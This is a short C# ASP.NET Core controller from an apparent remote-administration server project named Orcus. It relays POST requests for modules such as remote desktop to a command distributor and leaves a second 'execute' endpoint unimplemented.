using System;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Orcus.Modules.Api;
using Orcus.Server.Service;
using Orcus.Server.Service.Extensions;
using IActionResult = Microsoft.AspNetCore.Mvc.IActionResult;

namespace Orcus.Server.Controllers
{
    [Route("v1/pkg")]
    public class CommanderController : Controller
    {
        private readonly ICommandDistributer _commandDistributer;

        public CommanderController(ICommandDistributer commandDistributer)
        {
            _commandDistributer = commandDistributer;
        }

        //Path: v1/modules/Orcus.RemoteDesktop/start
        //Target: Server
        [HttpPost("v1/modules/{*path}")]
        public async Task ExecuteCommand(string path)
        {
            var response = await _commandDistributer.Execute(Request.ToHttpRequestMessage(path), CommandTarget.Server);
            response.CopyToHttpResponse(Response);
        }

        [HttpPost("v1/execute")]
        public Task<IActionResult> ExecuteCommand()
        {
            throw new NotImplementedException();
        }
    }
}